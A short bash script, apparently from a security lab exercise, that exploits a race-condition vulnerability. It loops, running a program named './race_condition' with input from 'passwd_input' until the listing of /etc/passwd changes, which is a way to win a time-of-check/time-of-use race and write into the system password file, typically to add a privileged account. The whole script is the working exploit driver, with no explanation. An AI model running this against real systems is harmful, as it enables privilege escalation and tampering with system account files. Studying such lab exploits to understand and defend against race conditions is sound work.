#!/bin/bash

CHECK_FILE="ls -l /etc/passwd"
before=$($CHECK_FILE)
after=$($CHECK_FILE)

while [ "$before" == "$after" ]
do
	./race_condition < passwd_input
	after=$($CHECK_FILE)
done
echo "Finish!"
